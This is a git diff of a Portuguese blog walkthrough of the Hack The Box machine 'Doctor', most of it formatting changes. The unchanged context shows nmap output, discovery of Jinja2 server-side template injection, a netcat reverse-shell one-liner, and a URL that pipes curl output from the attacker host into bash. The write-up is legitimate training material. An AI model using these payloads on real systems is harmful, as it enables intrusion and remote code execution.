@@ -3,19 +3,23 @@ title: 'Walktrough: HTB Doctor'
 date: 2021-02-06 12:00:00
 language: pt-BR
 localeid: htb-doctor
-authors: ['default']
+authors:
+  - default
 tags:
-- Walkthrough
-- HackTheBox
-- HTB Easy
-- HTB Linux
+  - Walkthrough
+  - HackTheBox
+  - HTB Easy
+  - HTB Linux
 ---
+
 Olá pessoal!
 
 Começando a postar sobre alguns write-ups de máquinas estilo CTF, a primeira a ser resolvida será **Doctor**, uma máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu) criada por [egotisticalSW](https://app.hackthebox.eu/users/94858).
 
-:information_source: **Info**: Write-ups para máquinas do Hack The Box serão postados assim que as máquinas sejam aposentadas, então segue abaixo a primeira :smiley:!
-
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box serão postados assim que as máquinas sejam aposentadas,
+  então segue abaixo a primeira :smiley:!
+</Alert>
 
 ![HTB Doctor](https://i.imgur.com/9JHTf6G.png)
 
@@ -32,7 +36,7 @@ Host is up (0.17s latency).
 Not shown: 997 filtered ports
 PORT     STATE SERVICE  VERSION
 22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
 |   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
 |_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
@@ -40,7 +44,7 @@ PORT     STATE SERVICE  VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Doctor
 8089/tcp open  ssl/http Splunkd httpd
-| http-robots.txt: 1 disallowed entry 
+| http-robots.txt: 1 disallowed entry
 |_/
 |_http-server-header: Splunkd
 |_http-title: splunkd
@@ -51,7 +55,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 63.98 seconds
-                                                                          
+
 ```
 
 ### 80 TCP - Serviço HTTP
@@ -76,7 +80,7 @@ $ sudo -i
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
- 
+
 # HTB Doctors
 10.10.10.209 doctors.htb
 ```
@@ -109,7 +113,7 @@ Depois de criá-la com sucesso, uma mensagem de aviso foi exibida conforme abaix
 Depois de criada, iniciada a enumeração pelo código fonte da página, onde encontrei um diretorio `/archive` comentado no código, mas nada foi exibido quando acessei a página pela primeira vez.
 
 ```html
- <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
+<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
 ```
 
 Avaliando as demais possibilidades parti para a criação de uma nova mensagem, uma das opções disponíveis, onde inseri o seguinte conteúdo para testes:
@@ -120,7 +124,7 @@ Acessando a mensagem postada na sequência, notei que é direcionado para a URL 
 
 Manipulando a url, consegui acessar outros posts, como por exemplo `http://doctors.htb/post/1` que se tratava de uma mensagem do usuário `admin` mas que não possuia nenhuma informação relevante.
 
-As coisas ficaram interessantes quando decidi acessar novamente o `/archive`, onde o conteúdo do título utilizado na mensagem criada foi exibido, o que levantou a possibilidade de obter um acesso inicial a partir da exploração via *Server-Side Template Injection (SSTI)*.
+As coisas ficaram interessantes quando decidi acessar novamente o `/archive`, onde o conteúdo do título utilizado na mensagem criada foi exibido, o que levantou a possibilidade de obter um acesso inicial a partir da exploração via _Server-Side Template Injection (SSTI)_.
 
 Para confirmar a possibilidade, seguindo o que encontrei em [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify), troquei o conteúdo do título da minha mensagem anterior para testar alguns tipos de injeção sugeridos, que nos permitirá identificar qual a engine utilizada e, posteriormente, criar o conteúdo malicioso para obter um acesso inicial.
 
@@ -145,13 +149,13 @@ Após confirmado que um payload para Jinja2 deveria ser utilizado, foi possível
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
 ```
-  
+
 - Este arquivo foi publicado a partir de um server HTTP simples utilizando python3, conforme execução do comando abaixo a partir do diretório onde o arquivo criado está localizado;
 
 ```bash
   sudo python3 -m http.server 80
 ```
-  
+
 - No portal, criei um novo post inserindo no lugar da string `title`, o conteúdo obtido no link acima citado do PayloadsAllTheThings. Este especificamente é bem interessante, pois nos permite executar comandos de forma dinâmica a partir do conteúdo recebido da variável **input** em um request do tipo GET, evitando assim modificar frequentemente o conteúdo da injeção:
 
 ```python
@@ -175,7 +179,6 @@ http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20ba
 ![HTB Doctor - Exploit](https://i.imgur.com/j9kreyv.png)
 
 **Bônus**: Pra facilitar na reobtenção deste acesso inicial, uma vez que a conta criada tem a validade curta de 20 min, criei um script simples em python para esta tarefa :smiley:.​ Para usá-lo basta configurar o listener e o webserver, da mesma forma que faríamos no método 100% manual, com a diferença de que o script irá recriar o usuário, configurar o payload malicioso na mensagem e fazer o request retornando o shell reverso novamente.
-
 
 ```python
 #!/usr/bin/python3
@@ -327,7 +330,7 @@ drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local
 -rw-r--r-- 1 shaun shaun  807 Sep  6 16:26 .profile
 -rw-rw-r-- 1 shaun shaun   66 Sep 15 12:51 .selected_editor
 -r-------- 1 shaun shaun   33 Jan 30 19:12 user.txt
-shaun@doctor:~$ cat user.txt 
+shaun@doctor:~$ cat user.txt
 <redacted>
 ```
 
@@ -337,7 +340,7 @@ Agora logado como shaun, notei que ele não possui nenhum privilégio especial n
 
 ```bash
 shaun@doctor:/tmp$ sudo -l
-[sudo] password for shaun: 
+[sudo] password for shaun:
 Sorry, user shaun may not run sudo on d
 ```
 
